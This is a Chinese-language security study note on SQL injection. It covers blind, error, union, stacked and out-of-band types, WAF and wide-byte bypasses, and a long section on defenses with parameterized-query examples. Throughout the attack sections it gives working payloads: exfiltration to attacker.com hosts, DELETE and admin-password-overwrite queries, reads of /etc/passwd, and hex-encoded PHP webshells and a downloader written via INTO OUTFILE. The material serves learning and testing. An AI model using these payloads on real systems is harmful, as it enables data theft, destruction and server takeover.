### 简介

SQL注入漏洞(SQL injection) - 对用户请求中的输入的参数值过滤不严(如动态拼接字符串)

### 类型

* 类型1 - "基于布尔的盲注"(boolean-based blind)
* 类型2 - "基于时间的盲注"(time-based blind)
* 类型3 - "基于报错的SQL注入"(error-based)
* 类型4 - "基于联合查询的SQL注入"(UNION query-based)
* 类型5 - "堆叠查询"(stacked queries)
* 类型6 - "带外"(out-of-band)

#### 类型1 - "基于布尔的盲注"(boolean-based blind)

temp

#### 类型2 - "基于时间的盲注"(time-based blind)

基于时间的盲注(Time-Based Blind SQL Injection Attacks)原理：使用能够"延时"的函数 构造SQL语句 然后根据响应时长(响应时间间隔的数值大小)进行判断

* 攻击利用payload - 利用SQLi漏洞进行"数据获取"
  * 方法1 利用"带外"方法 发出网络请求 以获取数据.  点击跳至[类型6 - "带外"(out-of-band)](#类型6---带外out-of-band)
  * 方法2 利用 "延时函数" 与 条件语法(Condition syntax) 得到True/False 逐个字符判断即可得到完整字符串值
    * 利用条件:后端稳定(响应时间间隔稳定)
    * "延时"函数
      * MySQL "延时"函数 `SLEEP(time)` 如HTTP请求的payload为 `(select*from(select(sleep(20)))a)`得到response的时间为20秒
      * MySQL "延时"函数 `BENCHMARK(count, expr)`
      * SQL Server "延时"函数 `WAIT FOR DELAY 'hh:mm:ss'` 如`SELECT * FROM users WHERE id=1; IF SYSTEM_USER='sa' WAIT FOR DELAY '00:00:05'`
      * SQL Server "延时"函数 `WAIT FOR TIME 'hh:mm:ss'`
      * PostgresSQL "延时"函数 `pg_sleep(5)` 如`SELECT CASE WHEN secret = 'secret' THEN pg_sleep(5) ELSE NULL END FROM apps WHERE id = 1 ;`
      * ...

参考 http://www.sqlinjection.net/time-based/

#### 类型3 - "基于报错的SQL注入"(error-based)

"基于报错的SQL注入"(error-based)原理:使错误消息中包含显示"所需数据",可以从数据库中直接提取敏感数据(而不是一次一个字符)

#### 类型4 - "基于联合查询的SQL注入"(UNION query-based)

temp

#### 类型5 - 堆叠查询(stacked queries)

堆叠查询(stacked queries)原理:通过分号分隔 实现执行多条SQL语句

* 攻击利用payload - 利用该漏洞"执行SQL语句" 操作数据
  * 无害延时 MySQL `SELECT * FROM products WHERE productid=1; select sleep(3)`
  * 删除数据 MySQL `SELECT * FROM products WHERE productid=1; DELETE FROM products`
  * 修改数据 MySQL `SELECT * FROM products WHERE categoryid=1; UPDATE members SET password='pwd' WHERE username='admin'`
  * ...

#### 类型6 - "带外"(out-of-band)

"带外"(out-of-band) 原理:利用目标主机A的数据库的相关函数发出"含有数据的"网络请求到服务器B  服务器B可接收到数据.

各种"盲注"的检测不稳定或无效时，常常借助"带外"实现"回显"(数据传输)

* 攻击利用payload - 利用该漏洞"执行SQL语句" 操作数据
  * 利用条件
    * 1.具体数据库具体版本的具体函数 实测能够发出网络请求
    * 2.目标主机A发出请求不被"网络限制"
  * "带外"函数
    * MySQL 发出DNS请求 - `SELECT LOAD_FILE(CONCAT('\\\\foo.',(select version()),'.attacker.com\\abc'));` 
      * 基础概念: UNC(Universal Naming Convention)路径是指Windows系统中资源的完整路径 注意UNC的路径字符串有最大长度限制
      * 利用条件: `LOAD_FILE`只支持Windows系统下的MySQL发出DNS请求，而Linux因为没有`UNC`路径所以不能
      * 注意转义: UNC名称一定以`\\`开头 如UNC名称`\\servername\sharename` 注意UNC名称中的每个`\`在MySQL中必须转义为`\\`
    * Oracle 发出HTTP请求 - `SELECT * FROM products WHERE id=1||UTL_HTTP.request('http://test.attacker.com/'||(SELECT user FROM DUAL)) --`
    * MSSQL 发出DNS请求 - `SELECT * FROM products WHERE id=1;EXEC master..xp_dirtree '\\test.attacker.com\' -- ` 扩展存储过程`xp_dirtree`用于指定的文件夹的所有文件夹的列表
    * ...

### 漏洞危害

[SQLi漏洞的各种具体利用方式【漏洞危害】 - The SQL Injection Knowledge Base](https://websec.ca/kb/sql_injection#MySQL_Writing_Files)

* 数据泄露 - 通过"带外通道"获取数据(Out Of Band Channeling)
  * DNS Requests
    * MySQL `LOAD_FILE`函数可发出DNS请求
  * SMB Requests
    * MySQL - `INTO OUTFILE`可以发出SMB请求  如 `' OR 1=1 INTO OUTFILE '\\\\attacker\\SMBshare\\output.txt`
* 数据删除
  * MySQL `DELETE FROM some_table WHERE 1; --`
* 绕过判断
  * Auth Bypass:如web登录功能存在SQLi 使用"万能密码"实现Login Bypass
* 系统命令执行(参考sqlmap)
  * MySQL的用户自定义函数 - 上传一个二进制文件:共享库(shared library)到对应文件夹，它包含两个UDF(user-defined functions)用户自定义函数(函数作用都是执行系统命令). 然后在数据库创建该函数 并调用该函数 即可执行系统命令
  * MSSQL的`xp_cmdshell` - 扩展存储过程(extended stored procedure) 它是SQL Server的配置项，启用时能让SQL Server账号执行操作系统命令，返回文本行
* 文件读写 - 前提:当前数据库user有FILE权限(通常数据库root用户才会有)
  * 读取文件(Reading Files)
    * MySQL - `LOAD_FILE()`
    * 例1 `SELECT LOAD_FILE('/etc/passwd');` 
    * 例2 `SELECT LOAD_FILE(0x2F6574632F706173737764);`
  * 写入文件(Writing Files)
    * MySQL - `select ... INTO OUTFILE` 能导出多行数据 会做格式处理(在行末端写入新行 会转义某些符号) 二进制文件会被破坏
    * MySQL - `select ... INTO DUMPFILE` 只能导出一行数据 不做格式处理 导出二进制文件 内容完全不变 依旧可运行
    * 例1 写入WebShell `SELECT '<? system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php';` 访问WebShell `http://localhost/shell.php?c=cat%20/etc/passwd`
    * 例2 Downloader `SELECT '<? fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?>' INTO OUTFILE '/var/www/get.php'` 访问 `http://localhost/get.php?f=shell.php&u=http://localhost/c99.txt`
    * ...

#### SQLi - WAFbypass

* 绕过方法
  * sqlmap tamper - 用注释分割关键字 `/**/` 等
  * HTTP参数污染(HTTP Parameter Pollution)
  * ...


利用SQL注入写入webshell被拦截 - 如何绕过黑名单字符`'` `<` `?`

步骤1. 对"php代码"进行编码转换:  hex <-> ascii
```
利用了数据库能够使用hex编码的特性

对webshell的"php代码"进行编码转换

ascii字符:
<?php @eval($_POST['cmd']);?>

编码为十六进制(hex)格式的数据: 在最前面加0x
0x3C3F70687020406576616C28245F504F53545B27636D64275D293B3F3E
```


步骤2. 对"SQL语句"进行编码转换:  hex <-> ascii
```
利用了数据库能够使用hex编码的特性

ascii字符:
select 0x3C3F70687020406576616C28245F504F53545B27636D64275D293B3F3E from xss limit 1 into outfile 'C:/shell.php'

编码为十六进制(hex)格式的数据: 在最前面加0x
0x73656c656374203078334333463730363837303230343036353736363136433238323435463530344635333534354232373633364436343237354432393342334633452066726f6d20787373206c696d6974203120696e746f206f757466696c652027433a2f7368656c6c2e70687027
```

步骤3. 使用数据库的`set`创建变量 被"预编译语句"使用:
```
mysql> use xssdb;
Database changed

mysql> set @a=0x73656C6563742030783343334637303638373032303430363537363631364332
38323435463530344635333534354232373633364436343237354432393342334633452066726F6D
20787373206C696D6974203120696E746F206F757466696C652027433A2F7368656C6C2E70687027;
Query OK, 0 rows affected (0.00 sec)

mysql> prepare tmp from @a;
Query OK, 0 rows affected (0.00 sec)
Statement prepared

mysql> execute tmp;
Query OK, 1 row affected (0.00 sec)
```

预编译原理
```
PREPARE statement_name FROM sql_text /*定义*/ 
EXECUTE statement_name [USING variable [,variable...]] /*填充实际变量值 执行预处理语句*/ 
DEALLOCATE PREPARE statement_name /*删除定义*/

如
mysql> PREPARE prod FROM "INSERT INTO examlple VALUES(?,?)"; 
mysql> SET @p='1'; 
mysql> SET @q='2'; 
mysql> EXECUTE prod USING @p,@q; 
mysql> SET @name='3'; 
mysql> EXECUTE prod USING @p,@name; 
mysql> DEALLOCATE PREPARE prod;
```

#### 数据获取 - 二分法

数据获取:自写脚本 利用SQL注入漏洞获取数据(用二分法"加速判断" 缩短判断次数 即缩短数据获取总时长)

```
test.get_version() #获取版本号
test.get_user_first() #获取数据库用户权限
test.get_user_count() #获取数据库用户数量
test.get_user_len() #获取数据库用户长度
test.get_user() #获取数据库当前用户名
test.get_db_count() #获取数据库数量
test.get_db_len() #获取数据库长度
test.get_database() #获取数据库名
test.get_table_len() #获取表名长度
test.get_table() #获取表名
test.get_columns_len() #获取字段名长度
test.get_columns() #获取字段名
test.get_content() #获取第一列第一个字段内容
```

#### 常见错误 - 写入文件失败

MySQL >= 5.7(可能更早的版本) 没有进行任何配置情况下`secure_file_priv`的默认值为`NULL` 即禁止mysqld导入或导出. 所以即使是MySQL的root用户也无法读写文件. 报错为

```
ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
```

查看当前环境中`secure-file-priv`的值:
```
mysql> show global variables like '%secure_file_priv%';
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv | NULL  |
+------------------+-------+
1 row in set (0.00 sec)
```

修改secure_file_priv的值:
```
# 要修改secure_file_priv的值，必须修改配置文件并重新启动`mysqld`服务
# windows下的配置文件为`my.ini`
# linux下的配置文件为`my.cnf`

[mysqld]
secure-file-priv = ""

# 情况1 没有进行任何配置情况下，`secure_file_priv`不存在，此时使用它的默认值`NULL` 即禁止mysqld导入或导出. 
# 情况2 secure_file_priv="/tmp/" 表示mysqld只能在/tmp/目录下 导入或导出.
# 情况3 secure-file-priv = ""    表示mysqld可以在任意目录进行导入或导出.
```

### 重点检测

#### 无法使用"预编译语句"的情况 - `order by`子句

为什么`order by`无法使用"预编译语句"? 
```
# MySQL:
# order by 子句的正常使用 如
select aid,adenname from sea_myad order by adenname;

# order by 子句之后的字段名 如果使用"预编译语句" 则字段名会被加上引号 从而order by子句"失效" 即不会对结果进行排序
select aid,adenname from sea_myad order by "adenname";
```

order by注入检测 - 基于布尔的注入

```
#条件语句，条件如果是执行第二个参数，否执行第三个参数
if(condition,true,false)

# 利用regexp
mysql> select aid,adenname from sea_myad order by (select 1 regexp if(1=1,1,0x00));
+-----+-------------------+
| aid | adenname          |
+-----+-------------------+
|   1 | channel200x200bt  |
|   2 | channel200x200top |
+-----+-------------------+


mysql> select aid,adenname from sea_myad order by (select 1 regexp if(1=2,1,0x00));
ERROR 1139 (42000): Got error 'empty (sub)expression' from regexp
```

order by注入检测 - 基于报错的注入
```
# 报错方式1
mysql> select aid,adenname from sea_myad order by updatexml(1,if(1=1,user(),2),1);
ERROR 1105 (HY000): XPATH syntax error: '@localhost'

# 报错方式2
mysql> select aid,adenname from sea_myad order by extractvalue(1,if(1=1,user(),2));
ERROR 1105 (HY000): XPATH syntax error: '@localhost'
```

order by注入检测 - 基于时间的注入
```
# 有几条记录 就延时几秒
# 记录很多的情况下 不能使用这种方式
mysql> select aid,adenname from sea_myad order by if(1=1,sleep(1),2);
```


#### 无法使用"预编译语句"的情况 - `limit`子句

* MySQL的`limit`子句注入
  * 漏洞场景 - MySQL中 当`order by`之后跟了`LIMIT`即二者一起使用时,注入点在`limit`子句之后的位置,该场景无法使用`union`语句进行联合查询.
  * 实际案例 - `SELECT freld FROM table WHERE id>0 ORDER BY id LIMIT injection_point`
  * 利用条件 -  5.0.0<MySQL版本<5.6.6   (MySQL版本>=5.7 无法利用. 因为`analyse()`的两个参数都只能为`uint`类型)

```
# MySQL limit子句注入 利用方式1 - 基于报错的注入
# limit之后可以跟`analyse()`函数
# 报错函数 extractvalue()等

mysql> SELECT field FROM user WHERE id >0 ORDER BY id LIMIT 1,1
       procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
ERROR 1105 (HY000): XPATH syntax error: ':5.5.41-0ubuntu0.14.04.1'
```

```
# MySQL limit子句注入 利用方式2 - 基于时间的注入
# limit之后可以跟`analyse()`函数
# 延时函数 实测只能用`benchmark` 而不能用`sleep`

SELECT field FROM table WHERE id > 0 ORDER BY id LIMIT 1,1
PROCEDURE analyse((select extractvalue(rand(),
concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)
```

```
# MySQL limit子句注入 利用方式3 - 写入文件
# 如果权限足够 可在`limit`之后跟`into`写入文件 得到webshell

# Hex <-> ASCII
# 3c3f7068702061737365727428245f504f53545b6173617361735d293b3f3e <-> <?php assert($_POST[asasas]);?>

SELECT 1 from mysql.user order by 1 limit 0,1 into outfile '/tmp/s.php' LINES TERMINATED BY 0x3c3f7068702061737365727428245f504f53545b6173617361735d293b3f3e;
```


* **PostgreSQL**的limit子句注入 可以回显(在MySQL下实测limit之后无法跟ascii函数 无法回显)
  * 漏洞场景 - PostgreSQL中 当`order by`之后跟了`LIMIT`即二者一起使用时,注入点在`limit`子句之后的位置,该场景无法使用`union`语句进行联合查询.
  * 实际案例 - `Select * from tbl_albums where page=2 order by album_date asc LIMIT 0,injection_point`
  * 使用ascii函数将substr函数返回的字符串转换为数字 `Select * from tbl_albums where page=2 order by album_date asc LIMIT 0,ascii(substr((Select version()),1,1))`
  * 数据回显 - 通过SQL语句执行结果 常体现为页面某种元素的数量(0-127之间),从而计算得到ascii码 <-> 真实字符


#### 宽字节注入 - 情况1 数据库使用了GBK编码

|字符|URL编码|描述|
|:-------------:|--|-----|
|`\`|%5c|常用来转义"非法"字符|
|'|%27|常用来改变SQL语句 将"数据"变为"代码"|

* 关键概念
  * addslashes函数:会进行转义 如将`'`变为`\'` 使单引号仅作为字符(数据) 而无法更改SQL语句(代码).
  * GBK编码:是GB2312编码的超集,向下完全兼容GB2312
  * GBK编码取值范围:第一个字节129-254，第二个字节64-254
* 测试过程(数据库使用了GBK编码)
  * 输入 - 将payload中的单引号`%27`都替换为`%df%27` 以便利用宽字节特性绕过转义
  * 转义 - 输入的数据`%df%27` 经过addslashes函数转义后(单引号被反斜杠转义)  变为`%df%5c%27`
  * 关键 - 从前向后解析 首先遇到2个字节`%df%5c` 因为它符合了GBK编码取值范围 会被转成一个汉字`運` 从而使`'`前的反斜杠`\`被吃掉
  * 执行 - 数据库使用了GBK编码 `set names gbk`  则得到`運'`

同理:更多变形参考GBK编码表

|payload|替换体|GBK解码结果|
|:-------------:|--|-----|
|%27|%df%27|運'|
|%27|%de%27|轡'|
|%27|%dd%27|輁'|

自动化:使用sqlmap的tamper脚本`--tamper "unmagicquotes.py"` 进行自动转换 `%27` -> `%df%27`

#### 宽字节注入 - 情况2 数据库使用了UTF-8编码

|字符|UTF-8 (hex)|URL Escape Code|GBK编码|Unicode Code Point|
|:-------------:|--|--|--|-----|
|錦|e98ca6(0xE9 0x8C 0xA6)|%E9%8C%A6|0xe55c|	\u9326 |


* 测试过程(数据库使用了UTF-8字符集`set names UTF-8`)
  * 输入 - 将payload中的单引号`%27`都替换为`%e5%5c%27` 以便后续利用宽字节特性绕过转义
  * 转义 - 输入的数据`%e5%5c%27` 经过addslashes函数转义(反斜杠被反斜杠转义) 变为`%e5%5c%5c%27`
  * 编码转换逻辑 - 为了使得SQL语句中的字符统一都是UTF-8编码的，web应用程序会将用户输入的GBK字符转为UTF-8字符，转换函数 `iconv`或`mb_convert_encoding` 
  * 编码转换 - GBK字符`%e5%5c%5c%27` 转换得到  UTF-8字符 `%e9%8c%a6%5c%5c%27`  从前向后解析 因为`%e9%8c%a6`为UTF字符`錦`
  * 执行 - 语句中是 `錦\\'` 可见单引号不再是字符(数据) 能够改变SQL语句(代码)

* 宽字节注入的修复方案
  * PHP 5 >= 5.2.3 - 使用 `mysql_set_charset`[php自带函数](https://www.php.net/manual/zh/function.mysql-set-charset.php)设置客户端的字符集(这是改变字符集的最佳方式)，并使用`mysql_real_escape_string`函数进行转义(此函数会考虑当前设置的字符集 不会出现宽字节注入)
  * PHP 7 - 移除了`mysql_set_charset`函数 只能通过以下2个扩展进行设置
    * 使用MySQLi扩展 `mysqli_character_set_name()`函数
    * 使用PDO: 添加 charset 到连接字符串 如`charset=utf8`

### SDL - 防御与修复方案

* 0.使用成熟的ORM框架

对象-关系映射(Object-Relational Mapping,ORM) 主要实现了面向对象编程中的"对象"到"关系数据库数据"的映射,正确使用成熟的ORM框架考可避免SQL注入

|语言|ORM框架|
|:-------------:|-----|
|Java|Hibernate|
|python|SQLAlchemy|
|golang|xorm|


* 1.使用带有"参数化查询"的"预编译语句"

"参数化查询"(Parameterized Query / Parameterized Statement)的原理:强制开发人员预先定义好所有SQL语句(留空待填) 应用程序将"实际参数"传入并查询.

这种编码风格使数据库能够区分"代码"和"数据".

不同语言的防御方案如下.

PHP - Laravel框架的 Eloquent ORM

PHP - 原生[使用PDO(PHP Data Objects)](https://php.net/manual/en/book.pdo.php) 支持任意数据库
```
// PDO常用函数
// PDOStatement::bindColumn — Bind a column to a PHP variable
// PDOStatement::bindParam — Binds a parameter to the specified variable name   bindParam()方法 可进行 强类型参数化查询(strongly typed parameterized queries)
// PDOStatement::bindValue — Binds a value to a parameter


// 实例化数据抽象层对象
$db = new PDO('pgsql:host=127.0.0.1;port=5432;dbname=testdb'); 
// 对 SQL 语句执行 prepare，得到 PDOStatement 对象 
$stmt = $db->prepare('SELECT * FROM "myTable" WHERE "id" = :id AND "is_valid" = :is_valid'); 
// 绑定参数
$stmt->bindValue(':id', $id); 
$stmt->bindValue(':is_valid', true); 
// 查询
$stmt->execute(); 
// 输出数据
foreach($stmt as $row) { 
var_dump($row); 
}
```

PHP - 使用MySQLi扩展 (仅支持MySQL数据库)
```
$stmt = $dbConnection->prepare('SELECT * FROM employees WHERE name = ?');
$stmt->bind_param('s', $name);
$stmt->execute();
$result = $stmt->get_result();
while ($row = $result->fetch_assoc()) {
    // do something with $row
}
```


.NET
```
// "参数化查询"
// 如 使用带有"绑定变量"的SqlCommand()函数 OleDbCommand()函数

String query = "SELECT account_balance FROM user_data WHERE user_name = ?";
try {
  OleDbCommand command = new OleDbCommand(query, connection);
  command.Parameters.Add(new OleDbParameter("customerName", CustomerName Name.Text));
  OleDbDataReader reader = command.ExecuteReader();
  // …
} catch (OleDbException se) {
  // error handling
} 
```


JAVA - 原生函数
```
// 预编译语句PreparedStatement()  需要和"参数绑定"一起使用

// This should REALLY be validated too
String custname = request.getParameter("customerName"); 
// Perform input validation to detect attacks
String query = "SELECT account_balance FROM user_data WHERE user_name = ? ";
PreparedStatement pstmt = connection.prepareStatement( query );
pstmt.setString( 1, custname); 
ResultSet results = pstmt.executeQuery( );
```

JAVA - Hibernate框架的`.createQuery()`函数与`.setParameter()`
```
// Hibernate Query Language (HQL) - Prepared Statement
// 在Hibernate中，绑定变量(bind variables) 被称为 "Named Parameters"

//不安全的HQL语句查询
//First is an unsafe HQL Statement
Query unsafeHQLQuery = session.createQuery("from Inventory where productID='"+userSuppliedParameter+"'");

//安全的HQL语句查询
//Here is a safe version of the same query using named parameters
Query safeHQLQuery = session.createQuery("from Inventory where productID=:productid");
safeHQLQuery.setParameter("productid", userSuppliedParameter);
```

SQLite
```
sqlite3_prepare()
```

Golang
```
// 对Postgres数据库
// This is for Postgres. Other SQL variants may use the ? character.
db.Exec("INSERT INTO users(name, email) VALUES($1, $2)",
  "Jon Calhoun", "jon@calhoun.io")
```

```
// 对mysql数据库
// http://mindbowser.com/golang-go-database-sql/
package main
 import (
 _ "github.com/go-sql-driver/mysql"
 "database/sql"
 "log"
 )
 
 func main(){
 db, err := sql.Open("mysql", "root:root@tcp(127.0.0.1:3306)/employeedb")
 
 // Connection Pooling methods
 db.SetConnMaxLifetime(500)
 db.SetMaxIdleConns(50)
 db.SetMaxOpenConns(10)
 db.Stats()
 
 if err != nil {
 log.Fatal(err)
 }
 tx,_:=db.Begin()
 stmt, err := tx.Prepare("INSERT INTO user(id,username) VALUES(?,?)")
 res,err:=stmt.Exec(4,"Abhijit")
 res,err=stmt.Exec(5,"Yogesh")
 if err!=nil{
 tx.Rollback()
 log.Fatal(err)
 }
 tx.Commit()
 log.Println(res)
}
```


* 2.存储过程

存储过程的安全性高，和预编译语句相同

存储过程使用的"SQL代码"定义和存储在数据库中，使用时被应用程序调用

如果使用了存储过程，开发者必须避免在存储过程中生成"不安全的动态SQL查询语句"

```
//JAVA中使用存储过程，该存储过程已经定义在数据库中:
String custname = request.getParameter("customerName");
try {
    CallableStatement cs = connection.prepareCall("{call sp_getAccountBalance(?)}");
    cs.setString(1, custname);
    ResultSet results = cs.executeQuery();
} catch (SQLException se) {
}
```

* 3.白名单输入验证(White List Input Validation) 

如`order by`和`limit`子句，无法使用"绑定变量"(bind variable)，就需要"白名单输入验证"

思路:判断用户传递的值 是否为该表中的其中一个列名.

hibernate框架 防御排序注入(order by)原理:判断用户传递的值是否为实体类的属性.


* 4.数据库用户权限最小化(Least Privilege)

参考OWASP [SQL_Injection_Prevention_Cheat_Sheet.md](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.md)
